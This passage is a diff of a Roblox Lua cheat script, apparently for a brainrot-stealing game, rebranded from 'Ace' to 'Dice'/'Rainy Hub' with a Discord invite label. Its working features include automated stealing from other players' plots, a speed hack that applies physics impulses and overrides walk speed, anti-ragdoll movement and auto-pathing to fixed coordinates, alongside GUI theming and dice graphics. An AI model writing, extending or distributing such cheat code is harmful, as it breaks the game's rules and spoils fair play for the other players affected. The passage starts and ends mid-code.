+while _G.DiceSemiSteal do
 if A.enabled or selectedStealMode == "Semi" then pcall(scanAllPlots) end
 task.wait(5)
 end
 end)
 end
-_G.AceSemiAutoStealSetRadius = function(v)
+_G.DiceSemiAutoStealSetRadius = function(v)
 local n = tonumber(v)
 if n then A.radius = n end
 end
-_G.AceSemiAutoStealStop = function()
+_G.DiceSemiAutoStealStop = function()
 A.enabled = false
 if A.conn then A.conn:Disconnect(); A.conn = nil end
 A.state.active = false
 A.state.phase = "idle"
 barReset()
 end
-_G.AceSemiAutoStealStart = function()
+_G.DiceSemiAutoStealStart = function()
 A.radius = tonumber(autoStealRadius) or A.radius or 10
 A.enabled = true
 ensureSync()
@@ -2601,7 +2776,7 @@ pcall(scanAllPlots)
 if A.conn then A.conn:Disconnect(); A.conn = nil end
 A.conn = RunService.Heartbeat:Connect(function()
 if not A.enabled then return end
-if selectedStealMode ~= "Semi" then _G.AceSemiAutoStealStop(); return end
+if selectedStealMode ~= "Semi" then _G.DiceSemiAutoStealStop(); return end
 if A.state.active then return end
 local target = pickClosest()
 if not target then return end
@@ -2609,36 +2784,90 @@ local prompt = findPromptForAnimal(target)
 if prompt then executeSemi(prompt, target) end
 end)
 end
-_G.AceSemiAutoStealSync = function()
+_G.DiceSemiAutoStealSync = function()
 if selectedStealMode == "Semi" and autoStealEnabled then
-_G.AceSemiAutoStealStart()
+_G.DiceSemiAutoStealStart()
 else
-_G.AceSemiAutoStealStop()
+_G.DiceSemiAutoStealStop()
 end
 end
 end
-_G.__AceSetupSemiAutoSteal()
-_G.AceAutoStealSync = function()
+_G.__DiceSetupSemiAutoSteal()
+_G.DiceAutoStealSync = function()
 if not autoStealEnabled then
-if _G.AceNormalAutoStealStop then _G.AceNormalAutoStealStop() end
-if _G.AceSemiAutoStealStop then _G.AceSemiAutoStealStop() end
+if _G.DiceNormalAutoStealStop then _G.DiceNormalAutoStealStop() end
+if _G.DiceSemiAutoStealStop then _G.DiceSemiAutoStealStop() end
 return
 end
 if selectedStealMode == "Normal" then
-if _G.AceSemiAutoStealStop then _G.AceSemiAutoStealStop() end
-if _G.AceNormalAutoStealSync then _G.AceNormalAutoStealSync() end
+if _G.DiceSemiAutoStealStop then _G.DiceSemiAutoStealStop() end
+if _G.DiceNormalAutoStealSync then _G.DiceNormalAutoStealSync() end
 elseif selectedStealMode == "Semi" then
-if _G.AceNormalAutoStealStop then _G.AceNormalAutoStealStop() end
-if _G.AceSemiAutoStealSync then _G.AceSemiAutoStealSync() end
+if _G.DiceNormalAutoStealStop then _G.DiceNormalAutoStealStop() end
+if _G.DiceSemiAutoStealSync then _G.DiceSemiAutoStealSync() end
 end
 end
 task.spawn(function()
 while task.wait(30) do
-saveAceConfig()
+saveDiceConfig()
 end
 end)
+-- ═══════════════════════════════════════════════════════════════
+-- SPEED ENGINE — ApplyImpulse
+-- The delta between where the assembly is going and where it should be
+-- going, applied as an impulse scaled by its own mass. Measured fresh
+-- every frame, so it settles exactly on the figure and a loaded carry
+-- accelerates like an empty character. Vertical velocity is left alone
+-- so jumps and falls behave.
+-- ═══════════════════════════════════════════════════════════════
+do
+local walkSpeedHeld = false
+-- Only ever touches the humanoid if we are the ones holding it off
+-- default, so the idle path costs a boolean rather than a lookup.
+function DiceReleaseWalkSpeed(hum)
+if not walkSpeedHeld then return end
+walkSpeedHeld = false
+if not hum then
+local char = LP.Character
+hum = char and char:FindFirstChildOfClass("Humanoid")
+end
+if hum and hum.WalkSpeed ~= 16 then pcall(function() hum.WalkSpeed = 16 end) end
+end
+function DiceApplyMoveSpeed(hrp, hum, dir, spd)
+-- Match before the push lands, so the humanoid is already walking at
+-- the target rather than hauling the character back toward 16.
+if diceMatchWalkSpeed and hum then
+if hum.WalkSpeed ~= spd then hum.WalkSpeed = spd end
+walkSpeedHeld = true
+end
+local mass = hrp.AssemblyMass or 1
+local current = hrp.AssemblyLinearVelocity
+local desired = Vector3.new(dir.X * spd, current.Y, dir.Z * spd)
+local delta = desired - current
+pcall(function() hrp:ApplyImpulse(Vector3.new(delta.X, 0, delta.Z) * mass) end)
+end
+end
 local lastMoveDir = Vector3.new(0, 0, 0)
+-- A brainrot in hand pins you to the lagger carry figure whatever the
+-- mode says — the Vynx rule. Auto Carry Speed drives the mode itself, so
+-- when it is on the mode is already the answer.
+local function hasBrainrotInHand()
+local char = LP.Character
+if not char then return false end
+for _, item in ipairs(char:GetChildren()) do
+if item:IsA("Tool") then
+local name = item.Name:lower()
+if name:find("brainrot", 1, true) or name:find("skibidi", 1, true) or name:find("toilet", 1, true) then
+return true
+end
+end
+end
+return false
+end
 local function getCurrentSpeedValue()
+if autoCarrySpeedEnabled ~= true and hasBrainrotInHand() then
+return LAGGER_CARRY_SPEED
+end
 if currentSpeedMode == "Carry" then
 return CS
 elseif currentSpeedMode == "Lagger" then
@@ -2657,7 +2886,7 @@ currentSpeedMode = mode
 if refreshSpeedModeRows then
 refreshSpeedModeRows()
 end
-saveAceConfig()
+saveDiceConfig()
 end
 local function toggleCarryMode()
 if currentSpeedMode == "Lagger" or currentSpeedMode == "Lagger Carry" then
@@ -2896,19 +3125,19 @@ Enable = enableCarrySpeedForSteal,
 Disable = disableAutoCarrySpeed,
 WatchPickup = startAutoCarryPickupWatch,
 }
-_G.AceAutoPathState = _G.AceAutoPathState or {leftConn=nil,rightConn=nil,leftPhase=1,rightPhase=1}
-_G.AceAutoPathPoints = _G.AceAutoPathPoints or {
+_G.DiceAutoPathState = _G.DiceAutoPathState or {leftConn=nil,rightConn=nil,leftPhase=1,rightPhase=1}
+_G.DiceAutoPathPoints = _G.DiceAutoPathPoints or {
 L1=Vector3.new(-476.48,-6.28,92.73), L2=Vector3.new(-483.12,-4.95,94.80), LFace=Vector3.new(-482.25,-4.96,92.09),
 R1=Vector3.new(-476.16,-6.52,25.62), R2=Vector3.new(-483.06,-5.03,25.48), RFace=Vector3.new(-482.06,-6.93,35.47),
 }
-function _G.AceAutoPathSpeed()
+function _G.DiceAutoPathSpeed()
 if currentSpeedMode == "Lagger" or currentSpeedMode == "Lagger Carry" then
 return LAGGER_SPEED
 end
 return NS
 end
-function _G.AceStopAutoLeft()
-local S=_G.AceAutoPathState
+function _G.DiceStopAutoLeft()
+local S=_G.DiceAutoPathState
 if S.leftConn then S.leftConn:Disconnect(); S.leftConn=nil end
 S.leftPhase=1
 local char=LP.Character
@@ -2917,8 +3146,8 @@ local hrp=char and char:FindFirstChild("HumanoidRootPart")
 if hum then hum:Move(Vector3.zero,false) end
 if hrp then hrp.AssemblyLinearVelocity=Vector3.new(0,hrp.AssemblyLinearVelocity.Y,0) end
 end
-function _G.AceStopAutoRight()
-local S=_G.AceAutoPathState
+function _G.DiceStopAutoRight()
+local S=_G.DiceAutoPathState
 if S.rightConn then S.rightConn:Disconnect(); S.rightConn=nil end
 S.rightPhase=1
 local char=LP.Character
@@ -2927,46 +3156,46 @@ local hrp=char and char:FindFirstChild("HumanoidRootPart")
 if hum then hum:Move(Vector3.zero,false) end
 if hrp then hrp.AssemblyLinearVelocity=Vector3.new(0,hrp.AssemblyLinearVelocity.Y,0) end
 end
-function _G.AceSetAutoLeft(on, skipSave)
-if on and _G.AceSafeModeTryStart and not _G.AceSafeModeTryStart() then
+function _G.DiceSetAutoLeft(on, skipSave)
+if on and _G.DiceSafeModeTryStart and not _G.DiceSafeModeTryStart() then
 autoLeftEnabled = false
-if _G.AceSetAutoLeftVisual then _G.AceSetAutoLeftVisual(false) end
-if not skipSave then saveAceConfig() end
+if _G.DiceSetAutoLeftVisual then _G.DiceSetAutoLeftVisual(false) end
+if not skipSave then saveDiceConfig() end
 return false
 end
 autoLeftEnabled = on and true or false
-if _G.AceSetAutoLeftVisual then _G.AceSetAutoLeftVisual(autoLeftEnabled) end
+if _G.DiceSetAutoLeftVisual then _G.DiceSetAutoLeftVisual(autoLeftEnabled) end
 if autoLeftEnabled then
 autoRightEnabled=false
-if _G.AceSetAutoRightVisual then _G.AceSetAutoRightVisual(false) end
-if _G.AceStopAutoRight then _G.AceStopAutoRight() end
-if _G.AceStartAutoLeft then _G.AceStartAutoLeft() end
+if _G.DiceSetAutoRightVisual then _G.DiceSetAutoRightVisual(false) end
+if _G.DiceStopAutoRight then _G.DiceStopAutoRight() end
+if _G.DiceStartAutoLeft then _G.DiceStartAutoLeft() end
 else
-if _G.AceStopAutoLeft then _G.AceStopAutoLeft() end
+if _G.DiceStopAutoLeft then _G.DiceStopAutoLeft() end
 end
-if not skipSave then saveAceConfig() end
+if not skipSave then saveDiceConfig() end
 end
-function _G.AceSetAutoRight(on, skipSave)
-if on and _G.AceSafeModeTryStart and not _G.AceSafeModeTryStart() then
+function _G.DiceSetAutoRight(on, skipSave)
+if on and _G.DiceSafeModeTryStart and not _G.DiceSafeModeTryStart() then
 autoRightEnabled = false
-if _G.AceSetAutoRightVisual then _G.AceSetAutoRightVisual(false) end
-if not skipSave then saveAceConfig() end
+if _G.DiceSetAutoRightVisual then _G.DiceSetAutoRightVisual(false) end
+if not skipSave then saveDiceConfig() end
 return false
 end
 autoRightEnabled = on and true or false
-if _G.AceSetAutoRightVisual then _G.AceSetAutoRightVisual(autoRightEnabled) end
+if _G.DiceSetAutoRightVisual then _G.DiceSetAutoRightVisual(autoRightEnabled) end
 if autoRightEnabled then
 autoLeftEnabled=false
-if _G.AceSetAutoLeftVisual then _G.AceSetAutoLeftVisual(false) end
-if _G.AceStopAutoLeft then _G.AceStopAutoLeft() end
-if _G.AceStartAutoRight then _G.AceStartAutoRight() end
+if _G.DiceSetAutoLeftVisual then _G.DiceSetAutoLeftVisual(false) end
+if _G.DiceStopAutoLeft then _G.DiceStopAutoLeft() end
+if _G.DiceStartAutoRight then _G.DiceStartAutoRight() end
 else
-if _G.AceStopAutoRight then _G.AceStopAutoRight() end
+if _G.DiceStopAutoRight then _G.DiceStopAutoRight() end
 end
-if not skipSave then saveAceConfig() end
+if not skipSave then saveDiceConfig() end
 end
-function _G.AceStartAutoLeft()
-local S=_G.AceAutoPathState
+function _G.DiceStartAutoLeft()
+local S=_G.DiceAutoPathState
 if S.leftConn then S.leftConn:Disconnect() end
 S.leftPhase=1
 S.leftConn=RunService.Heartbeat:Connect(function()
@@ -2977,8 +3206,8 @@ local hum=char:FindFirstChildOfClass("Humanoid")
 if not hrp or not hum then return end
 local st=hum:GetState()
 if hum.PlatformStand or st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown then hum:Move(Vector3.zero,false); return end
-local P=_G.AceAutoPathPoints
-local spd=_G.AceAutoPathSpeed()
+local P=_G.DiceAutoPathPoints
+local spd=_G.DiceAutoPathSpeed()
 if S.leftPhase==1 then
 local tgt=Vector3.new(P.L1.X,hrp.Position.Y,P.L1.Z)
 if (tgt-hrp.Position).Magnitude<1 then
@@ -3001,11 +3230,11 @@ hrp.AssemblyLinearVelocity=Vector3.zero
 autoLeftEnabled=false
 if S.leftConn then S.leftConn:Disconnect(); S.leftConn=nil end
 S.leftPhase=1
-if _G.AceSetAutoLeftVisual then _G.AceSetAutoLeftVisual(false) end
+if _G.DiceSetAutoLeftVisual then _G.DiceSetAutoLeftVisual(false) end
 if P.LFace and (P.LFace-hrp.Position).Magnitude>0.01 then
 hrp.CFrame=CFrame.new(hrp.Position,Vector3.new(P.LFace.X,hrp.Position.Y,P.LFace.Z))
 end
-saveAceConfig()
+saveDiceConfig()
 return
 end
 local d=P.L2-hrp.Position
@@ -3015,8 +3244,8 @@ hrp.AssemblyLinearVelocity=Vector3.new(mv.X*spd,hrp.AssemblyLinearVelocity.Y,mv.
 end
 end)
 end
-function _G.AceStartAutoRight()
-local S=_G.AceAutoPathState
+function _G.DiceStartAutoRight()
+local S=_G.DiceAutoPathState
 if S.rightConn then S.rightConn:Disconnect() end
 S.rightPhase=1
 S.rightConn=RunService.Heartbeat:Connect(function()
@@ -3027,8 +3256,8 @@ local hum=char:FindFirstChildOfClass("Humanoid")
 if not hrp or not hum then return end
 local st=hum:GetState()
 if hum.PlatformStand or st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown then hum:Move(Vector3.zero,false); return end
-local P=_G.AceAutoPathPoints
-local spd=_G.AceAutoPathSpeed()
+local P=_G.DiceAutoPathPoints
+local spd=_G.DiceAutoPathSpeed()
 if S.rightPhase==1 then
 local tgt=Vector3.new(P.R1.X,hrp.Position.Y,P.R1.Z)
 if (tgt-hrp.Position).Magnitude<1 then
@@ -3051,11 +3280,11 @@ hrp.AssemblyLinearVelocity=Vector3.zero
 autoRightEnabled=false
 if S.rightConn then S.rightConn:Disconnect(); S.rightConn=nil end
 S.rightPhase=1
-if _G.AceSetAutoRightVisual then _G.AceSetAutoRightVisual(false) end
+if _G.DiceSetAutoRightVisual then _G.DiceSetAutoRightVisual(false) end
 if P.RFace and (P.RFace-hrp.Position).Magnitude>0.01 then
 hrp.CFrame=CFrame.new(hrp.Position,Vector3.new(P.RFace.X,hrp.Position.Y,P.RFace.Z))
 end
-saveAceConfig()
+saveDiceConfig()
 return
 end
 local d=P.R2-hrp.Position
@@ -3067,8 +3296,8 @@ end)
 end
 LP.CharacterAdded:Connect(function()
 task.wait(0.5)
-if autoLeftEnabled and _G.AceStartAutoLeft then _G.AceStartAutoLeft() end
-if autoRightEnabled and _G.AceStartAutoRight then _G.AceStartAutoRight() end
+if autoLeftEnabled and _G.DiceStartAutoLeft then _G.DiceStartAutoLeft() end
+if autoRightEnabled and _G.DiceStartAutoRight then _G.DiceStartAutoRight() end
 end)
 local overheadGui = nil
 local overheadSpeedLabel = nil
@@ -3082,7 +3311,7 @@ if not char then return end
 local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 5)
 if not head then return end
 overheadGui = Instance.new("BillboardGui")
-overheadGui.Name = "AceDuelsOverheadInfo"
+overheadGui.Name = "RainyHubOverheadInfo"
 overheadGui.Size = UDim2.new(0, 250, 0, 88)
 overheadGui.StudsOffset = Vector3.new(0, 1.75, 0)
 overheadGui.AlwaysOnTop = true
@@ -3095,7 +3324,7 @@ ragdollCountdownLabel.Position = UDim2.new(0, 0, 0, 0)
 ragdollCountdownLabel.BackgroundTransparency = 1
 ragdollCountdownLabel.Text = ""
 ragdollCountdownLabel.Visible = false
-ragdollCountdownLabel.TextColor3 = Color3.fromRGB(80, 255, 120)
+ragdollCountdownLabel.TextColor3 = Color3.fromRGB(240, 240, 244)
 ragdollCountdownLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
 ragdollCountdownLabel.TextStrokeTransparency = 0
 ragdollCountdownLabel.Font = Enum.Font.GothamBlack
@@ -3103,34 +3332,45 @@ ragdollCountdownLabel.TextSize = 22
 ragdollCountdownLabel.TextXAlignment = Enum.TextXAlignment.Center
 ragdollCountdownLabel.ZIndex = 10
 ragdollCountdownLabel.Parent = overheadGui
-local discordLbl = Instance.new("TextLabel")
-discordLbl.Name = "Discord"
-discordLbl.Size = UDim2.new(1, 0, 0, 30)
-discordLbl.Position = UDim2.new(0, 0, 0, 26)
-discordLbl.BackgroundTransparency = 1
-discordLbl.Text = "discord.gg/rainyhub"
-discordLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
-discordLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-discordLbl.TextStrokeTransparency = 0
-discordLbl.Font = Enum.Font.GothamBlack
-discordLbl.TextSize = 21
-discordLbl.TextXAlignment = Enum.TextXAlignment.Center
-discordLbl.ZIndex = 10
-discordLbl.Parent = overheadGui
+-- Speed on top, discord under it, both heavy white on a thick black
+-- outline so they hold up against whatever is behind the character.
 overheadSpeedLabel = Instance.new("TextLabel")
 overheadSpeedLabel.Name = "Speed"
-overheadSpeedLabel.Size = UDim2.new(1, 0, 0, 26)
-overheadSpeedLabel.Position = UDim2.new(0, 0, 0, 54)
+overheadSpeedLabel.Size = UDim2.new(1, 0, 0, 32)
+overheadSpeedLabel.Position = UDim2.new(0, 0, 0, 24)
 overheadSpeedLabel.BackgroundTransparency = 1
-overheadSpeedLabel.Text = "Speed: 0"
+overheadSpeedLabel.Text = "Speed: 0 | Normal"
 overheadSpeedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 overheadSpeedLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
 overheadSpeedLabel.TextStrokeTransparency = 0
 overheadSpeedLabel.Font = Enum.Font.GothamBlack
-overheadSpeedLabel.TextSize = 19
+overheadSpeedLabel.TextSize = 26
 overheadSpeedLabel.TextXAlignment = Enum.TextXAlignment.Center
 overheadSpeedLabel.ZIndex = 10
 overheadSpeedLabel.Parent = overheadGui
+do
+local outline = Instance.new("UIStroke")
+outline.Color = Color3.fromRGB(0, 0, 0)
+outline.Thickness = 2.5
+outline.Transparency = 0
+outline.Parent = overheadSpeedLabel
+end
+local discordLbl = Instance.new("TextLabel")
+discordLbl.Name = "Discord"
+discordLbl.Size = UDim2.new(1, 0, 0, 28)
+discordLbl.Position = UDim2.new(0, 0, 0, 56)
+discordLbl.BackgroundTransparency = 1
+discordLbl.Text = "discord.gg/rainyhub"
+discordLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+discordLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+-- Lighter than the speed line above it: the handle is there to be read,
+-- not to compete with the number.
+discordLbl.TextStrokeTransparency = 0.35
+discordLbl.Font = Enum.Font.GothamBold
+discordLbl.TextSize = 19
+discordLbl.TextXAlignment = Enum.TextXAlignment.Center
+discordLbl.ZIndex = 10
+discordLbl.Parent = overheadGui
 end
 local ragdollCountdownConn = nil
 local ragdollCountdownCharConn = nil
@@ -3182,9 +3422,9 @@ if left > 0 then
 ragdollCountdownLabel.Visible = true
 ragdollCountdownLabel.Text = string.format("RAGDOLL %.1f", left)
 if left <= 1 then
-ragdollCountdownLabel.TextColor3 = Color3.fromRGB(255, 230, 90)
+ragdollCountdownLabel.TextColor3 = Color3.fromRGB(150, 150, 156)
 else
-ragdollCountdownLabel.TextColor3 = Color3.fromRGB(80, 255, 120)
+ragdollCountdownLabel.TextColor3 = Color3.fromRGB(240, 240, 244)
 end
 else
 ragdollCountdownLabel.Visible = false
@@ -3214,47 +3454,76 @@ or state == Enum.HumanoidStateType.Physics
 or state == Enum.HumanoidStateType.Ragdoll
 or state == Enum.HumanoidStateType.FallingDown then
 lastMoveDir = Vector3.new(0, 0, 0)
+-- Ragdolled: hand the humanoid back rather than holding it off default
+-- while the game has control.
+DiceReleaseWalkSpeed(hum)
 return
 end
+if not autoLeftEnabled and not autoRightEnabled then
 local md = hum.MoveDirection
 local spd = getCurrentSpeedValue()
-if not autoLeftEnabled and not autoRightEnabled and md.Magnitude > 0 then
+local dir = Vector3.new(0, 0, 0)
+if md.Magnitude > 0 then
 lastMoveDir = md
-hrp.Velocity = Vector3.new(md.X * spd, hrp.Velocity.Y, md.Z * spd)
+dir = md
+elseif antiRagdollEnabled and lastMoveDir.Magnitude > 0 then
+-- MoveDirection drops to zero the instant a ragdoll starts, so with
+-- anti ragdoll on we keep driving the last heading while the key is
+-- still down instead of stalling mid-stride.
+local anyHeld = false
+for key in pairs(MOVE_KEYS) do
+if UserInputService:IsKeyDown(key) then anyHeld = true break end
+end
+if anyHeld then dir = lastMoveDir end
+end
+if dir.Magnitude > 0 then
+DiceApplyMoveSpeed(hrp, hum, dir, spd)
+else
+DiceReleaseWalkSpeed(hum)
+end
+else
+-- Auto path drives the character itself.
+DiceReleaseWalkSpeed(hum)
 end
 if overheadSpeedLabel then
 local v = hrp.AssemblyLinearVelocity or hrp.Velocity
 local speedMag = Vector3.new(v.X, 0, v.Z).Magnitude
 local rounded = math.floor(speedMag * 10 + 0.5) / 10
+local shown
 if math.abs(rounded - math.floor(rounded)) < 0.05 then
-overheadSpeedLabel.Text = string.format("Speed: %d", math.floor(rounded + 0.5))
+shown = string.format("%d", math.floor(rounded + 0.5))
 else
-overheadSpeedLabel.Text = string.format("Speed: %.1f", rounded)
+shown = string.format("%.1f", rounded)
 end
+overheadSpeedLabel.Text = string.format("Speed: %s | %s", shown, tostring(currentSpeedMode or "Normal"))
 end
 end)
--- Rainy Hub palette. The keys are unchanged, so every control built by
--- the shared row helpers picks up the theme without touching its call site.
+-- Monochrome dice table: near-black panels, white pips, white accent.
+-- There is no hue anywhere in the palette on purpose — the accent is
+-- plain white and does the work a colour would normally do.
+-- Rainy Hub palette. Keys are unchanged so every control built by the
+-- shared helpers picks it up, and the toggles already key off accent.
 local COLORS = {
 bg = Color3.fromRGB(6, 10, 20),
 row = Color3.fromRGB(13, 21, 38),
-row2 = Color3.fromRGB(16, 26, 46),
+row2 = Color3.fromRGB(17, 27, 48),
 stroke = Color3.fromRGB(40, 66, 110),
 strokeSoft = Color3.fromRGB(23, 39, 70),
 white = Color3.fromRGB(240, 246, 255),
 textDim = Color3.fromRGB(136, 156, 188),
 toggleBg = Color3.fromRGB(60, 68, 84),
 knob = Color3.fromRGB(236, 243, 255),
+accent = Color3.fromRGB(56, 138, 255),
+accentDim = Color3.fromRGB(126, 186, 255),
+accentSoft = Color3.fromRGB(20, 40, 78),
 }
 local RAIN = {
-sidebar = Color3.fromRGB(5, 9, 18),
-accent = Color3.fromRGB(56, 138, 255),
-accentDim = Color3.fromRGB(26, 74, 152),
-accentGlow = Color3.fromRGB(126, 186, 255),
+glow = Color3.fromRGB(126, 186, 255),
 drop = Color3.fromRGB(158, 202, 255),
-good = Color3.fromRGB(64, 214, 132),
+deep = Color3.fromRGB(14, 36, 80),
+mid = Color3.fromRGB(46, 102, 180),
+light = Color3.fromRGB(176, 216, 255),
 }
-local SIDE_W = 206
 function corner(parent, radius)
 local c = Instance.new("UICorner")
 c.CornerRadius = UDim.new(0, radius or 8)
@@ -3268,30 +3537,199 @@ s.Color = color or COLORS.stroke
 s.Thickness = thickness or 1
 s.Transparency = transparency or 0.35
 s.Parent = parent
-local g = Instance.new("UIGradient")
-g.Color = ColorSequence.new({
-ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 190, 255)),
-ColorSequenceKeypoint.new(0.5, Color3.fromRGB(56, 116, 200)),
-ColorSequenceKeypoint.new(1, Color3.fromRGB(140, 190, 255)),
-})
-g.Transparency = NumberSequence.new({
-NumberSequenceKeypoint.new(0, 0.55),
-NumberSequenceKeypoint.new(0.5, 0.1),
-NumberSequenceKeypoint.new(1, 0.55),
-})
-g.Parent = s
+-- Flat border. The shimmering gradient that used to live here fought
+-- with the dice motif and made every edge look the same shade of busy.
 return s
 end
 function tween(obj, props, time)
 TweenService:Create(obj, TweenInfo.new(time or 0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
 end
-function makeDraggable(frame)
+-- ═══════════════════════════════════════════════════════════════
+-- DICE
+-- Drawn from frames, so there is no image asset to load and the faces
+-- can be repainted at will. Each die is a stack — contact shadow, the
+-- block's extruded edge, a lit face under a bevelled rim, and pips
+-- drilled into the surface — lit consistently from the top left.
+-- Returns the die and a face setter.
+-- ═══════════════════════════════════════════════════════════════
+local DIE_PIPS = {
+[1] = {{0.5, 0.5}},
+[2] = {{0.28, 0.28}, {0.72, 0.72}},
+[3] = {{0.26, 0.26}, {0.5, 0.5}, {0.74, 0.74}},
+[4] = {{0.28, 0.28}, {0.72, 0.28}, {0.28, 0.72}, {0.72, 0.72}},
+[5] = {{0.27, 0.27}, {0.73, 0.27}, {0.5, 0.5}, {0.27, 0.73}, {0.73, 0.73}},
+[6] = {{0.28, 0.23}, {0.72, 0.23}, {0.28, 0.5}, {0.72, 0.5}, {0.28, 0.77}, {0.72, 0.77}},
+}
+function makeDie(parent, sizePx, value, dark, fade)
+fade = tonumber(fade) or 0
+-- Every layer dims together, so transparencies are quoted at full
+-- strength and pushed through this.
+local function dim(t) return t + (1 - t) * fade end
+-- Below ~20px the sheen and the drilled pip rims land on half a pixel
+-- and just muddy the face; past half transparency nobody can see them
+-- either. Either way they are instances the backdrop need not pay for.
+local detailed = sizePx >= 20 and fade < 0.5
+local radius = math.max(3, math.floor(sizePx * 0.2))
+local depth = math.max(1, math.floor(sizePx * 0.085))
+local die = Instance.new("Frame")
+die.Name = "Die"
+die.Size = UDim2.new(0, sizePx, 0, sizePx)
+die.BackgroundTransparency = 1
+die.BorderSizePixel = 0
+die.ZIndex = (parent.ZIndex or 1) + 1
+die.Parent = parent
+local z = die.ZIndex
+-- Contact shadow, softened by stacking two offset layers.
+for i = 1, (detailed and 2 or 1) do
+local shade = Instance.new("Frame")
+shade.Name = "Shadow" .. i
+shade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+shade.BackgroundTransparency = dim(0.42 + (i - 1) * 0.26)
+shade.BorderSizePixel = 0
+shade.Position = UDim2.new(0, depth + i, 0, depth + i + 1)
+shade.Size = UDim2.new(1, i, 1, i)
+shade.ZIndex = z
+shade.Parent = die
+corner(shade, radius + i)
+end
+-- The extruded edge of the block, offset down-right and turned away
+-- from the light, so the face reads as the top of a cube.
+local block = Instance.new("Frame")
+block.Name = "Block"
+block.BackgroundColor3 = dark and Color3.fromRGB(8, 8, 10) or Color3.fromRGB(126, 126, 132)
+block.BackgroundTransparency = dim(0)
+block.BorderSizePixel = 0
+block.Position = UDim2.new(0, depth, 0, depth)
+block.Size = UDim2.new(1, 0, 1, 0)
+block.ZIndex = z + 1
+block.Parent = die
+corner(block, radius)
+do
+local g = Instance.new("UIGradient")
+g.Color = ColorSequence.new(
+dark and Color3.fromRGB(32, 32, 36) or Color3.fromRGB(170, 170, 176),
+dark and Color3.fromRGB(3, 3, 4) or Color3.fromRGB(88, 88, 94))
+g.Rotation = 90
+g.Parent = block
+end
+-- The lit face.
+local face = Instance.new("Frame")
+face.Name = "Face"
+face.BackgroundColor3 = dark and Color3.fromRGB(24, 24, 28) or Color3.fromRGB(248, 248, 251)
+face.BackgroundTransparency = dim(0)
+face.BorderSizePixel = 0
+face.Size = UDim2.new(1, 0, 1, 0)
+face.ZIndex = z + 2
+face.Parent = die
+corner(face, radius)
+do
+local g = Instance.new("UIGradient")
+g.Color = ColorSequence.new({
+ColorSequenceKeypoint.new(0, dark and Color3.fromRGB(58, 58, 64) or Color3.fromRGB(255, 255, 255)),
+ColorSequenceKeypoint.new(0.5, dark and Color3.fromRGB(26, 26, 30) or Color3.fromRGB(237, 237, 242)),
+ColorSequenceKeypoint.new(1, dark and Color3.fromRGB(9, 9, 11) or Color3.fromRGB(196, 196, 204)),
+})
+g.Rotation = 118
+g.Parent = face
+end
+-- Bevelled rim: bright along the lit edge, dark where it turns away.
+local rim = Instance.new("UIStroke")
+rim.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+rim.Thickness = math.max(1, sizePx * 0.05)
+rim.Transparency = dim(0.12)
+rim.Color = Color3.fromRGB(255, 255, 255)
+rim.Parent = face
+do
+local g = Instance.new("UIGradient")
+g.Color = ColorSequence.new(
+dark and Color3.fromRGB(104, 104, 112) or Color3.fromRGB(255, 255, 255),
+dark and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(112, 112, 120))
+g.Rotation = 118
+g.Parent = rim
+end
+if detailed then
+local sheen = Instance.new("Frame")
+sheen.Name = "Sheen"
+sheen.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+sheen.BackgroundTransparency = dim(dark and 0.8 or 0.55)
+sheen.BorderSizePixel = 0
+sheen.Position = UDim2.new(0, math.floor(sizePx * 0.1), 0, math.floor(sizePx * 0.08))
+sheen.Size = UDim2.new(1, -math.floor(sizePx * 0.2), 0, math.max(2, math.floor(sizePx * 0.34)))
+sheen.ZIndex = z + 3
+sheen.Parent = face
+corner(sheen, math.max(2, math.floor(radius * 0.8)))
+local g = Instance.new("UIGradient")
+g.Transparency = NumberSequence.new({
+NumberSequenceKeypoint.new(0, 0),
+NumberSequenceKeypoint.new(1, 1),
+})
+g.Rotation = 90
+g.Parent = sheen
+end
+local pipSize = math.max(2, math.floor(sizePx * 0.19))
+-- Six pips is the most any face needs; the rest are hidden per value.
+local pips = {}
+for i = 1, 6 do
+local pip = Instance.new("Frame")
+pip.Name = "Pip" .. i
+pip.AnchorPoint = Vector2.new(0.5, 0.5)
+pip.Size = UDim2.new(0, pipSize, 0, pipSize)
+pip.BackgroundColor3 = dark and Color3.fromRGB(238, 238, 244) or Color3.fromRGB(20, 20, 23)
+pip.BackgroundTransparency = dim(0)
+pip.BorderSizePixel = 0
+pip.Visible = false
+pip.ZIndex = z + 4
+pip.Parent = face
+corner(pip, 999)
+-- Drilled, not painted. With the key light up at the top left, the
+-- near wall of the hole shades itself and the far wall catches the
+-- bounce, so the gradient runs along the same axis as the face.
+local g = Instance.new("UIGradient")
+g.Color = ColorSequence.new(
+dark and Color3.fromRGB(252, 252, 255) or Color3.fromRGB(4, 4, 6),
+dark and Color3.fromRGB(172, 172, 180) or Color3.fromRGB(84, 84, 92))
+g.Rotation = 118
+g.Parent = pip
+if detailed then
+local lip = Instance.new("UIStroke")
+lip.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+lip.Thickness = math.max(0.5, sizePx * 0.018)
+lip.Transparency = dim(0.45)
+lip.Color = dark and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
+lip.Parent = pip
+-- The polished edge of the bore only catches light on the far side.
+local lg = Instance.new("UIGradient")
+lg.Transparency = NumberSequence.new({
+NumberSequenceKeypoint.new(0, 1),
+NumberSequenceKeypoint.new(1, 0),
+})
+lg.Rotation = 118
+lg.Parent = lip
+end
+pips[i] = pip
+end
+local function setFace(v)
+v = math.clamp(math.floor(tonumber(v) or 1), 1, 6)
+local layout = DIE_PIPS[v]
+for i = 1, 6 do
+local spot = layout[i]
+pips[i].Visible = spot ~= nil
